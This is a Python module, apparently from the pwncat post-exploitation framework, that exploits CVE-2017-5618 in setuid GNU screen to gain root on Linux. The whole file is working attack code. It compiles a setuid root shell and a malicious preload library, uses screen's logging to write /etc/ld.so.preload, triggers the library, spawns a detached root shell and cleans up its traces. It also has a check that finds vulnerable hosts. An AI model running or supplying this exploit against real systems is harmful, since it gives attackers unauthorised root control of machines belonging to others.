#!/usr/bin/env python3
import re
import textwrap
import subprocess
from io import StringIO

from pwncat.facts import ExecuteAbility
from pwncat.modules import ModuleFailed
from pwncat.platform import PlatformError
from pwncat.subprocess import CalledProcessError
from pwncat.platform.linux import Linux
from pwncat.modules.enumerate import Schedule, EnumerateModule


class CVE_2017_5618(ExecuteAbility):
    """ Exploit CVE-2017-5618 """

    def __init__(self, source: str, screen):
        super().__init__(source=source, source_uid=None, uid=0)

        self.screen = screen

    def shell(self, session: "pwncat.manager.Session"):
        """ Execute a shell """

        # Write the rootshell source code
        rootshell_source = textwrap.dedent(
            f"""
                #include <stdio.h>
                #include <unistd.h>
                int main(void){{
                    setreuid(0,0);
                    setregid(0,0);
                    const char* x[] = {{"/bin/sh","-p",NULL}};
                    execvp(x[0], x);
                }}
                """
        ).lstrip()

        with session.platform.tempfile(mode="w", directory="/tmp") as filp:
            rootshell = filp.name

        # Compile the rootshell binary
        try:
            rootshell = session.platform.compile(
                [StringIO(rootshell_source)], output=rootshell
            )
        except PlatformError as exc:
            raise ModuleFailed(f"compilation failed: {exc}") from exc

        # Write the library
        libhack_source = textwrap.dedent(
            f"""
                #include <stdio.h>
                #include <sys/types.h>
                #include <unistd.h>
                __attribute__ ((__constructor__))
                void dropshell(void){{
                    chown("{rootshell}", 0, 0);
                    chmod("{rootshell}", 04755);
                    unlink("/etc/ld.so.preload");
                }}
                """
        ).lstrip()

        # Compile libhack
        try:
            libhack_so = session.platform.compile(
                [StringIO(libhack_source)],
                cflags=["-fPIC", "-shared"],
                ldflags=["-ldl"],
            )
        except PlatformError as exc:
            session.platform.Path(rootshell).unlink()
            raise ModuleFailed("compilation failed: {exc}") from exc

        # Switch to /etc but save our previous directory so we can return to it
        old_cwd = session.platform.chdir("/etc")

        # Run screen with our library, saving the umask before changing it
        start_umask = session.platform.umask()
        session.platform.umask(0o000)

        # Run screen, loading our library and causing our rootshell to be SUID
        session.platform.run(
            [
                self.screen.path,
                "-D",
                "-m",
                "-L",
                "ld.so.preload",
                "echo",
                "-ne",
                libhack_so,
            ],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            check=True,
        )

        # Trigger the exploit
        try:
            session.platform.run(
                [self.screen.path, "-ls"],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                check=True,
            )
        except CalledProcessError:
            # This normally has a non-zero returncode
            pass

        # We no longer need the shared object
        session.platform.Path(libhack_so).unlink()

        # Reset umask to the saved value
        session.platform.umask(start_umask)

        # Hop back to the original directory
        try:
            session.platform.chdir(old_cwd)
        except (FileNotFoundError, NotADirectoryError, PermissionError):
            # Maybe we don't have permissions to go back?
            pass

        # Check if the file is owned by root
        if session.platform.Path(rootshell).owner() != "root":
            # Ensure the files are removed
            session.platform.Path(rootshell).unlink()

            raise ModuleFailed("failed to create root shell")

        # Start the root shell!
        proc = session.platform.Popen(
            [rootshell],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )

        # Detach. This new shell becomes our primary shell
        proc.detach()

        if session.platform.refresh_uid() != 0:
            session.platform.channel.send(b"exit\n")
            raise ModuleFailed("failed to get root shell (is nosuid set on /tmp?)")

        # Remove the rootshell
        session.platform.Path(rootshell).unlink()

        return lambda s: s.platform.channel.send(b"exit\n")

    def title(self, session):
        """ Grab the description for this fact """

        return f"[cyan]{self.screen.path}[/cyan] vulnerable to [red]CVE-2017-5618[/red]"


class Module(EnumerateModule):
    """ Identify systems vulnerable to CVE-2017-5618 """

    PROVIDES = ["ability.execute"]
    PLATFORM = [Linux]
    SCHEDULE = Schedule.PER_USER

    def enumerate(self, session: "pwncat.manager.Session"):
        """ check for vulnerable screen versions """

        for screen in session.run("enumerate", types=["software.screen.version"]):
            if not screen.vulnerable or (screen.perms & 0o4000) == 0:
                continue

            yield CVE_2017_5618(self.name, screen)
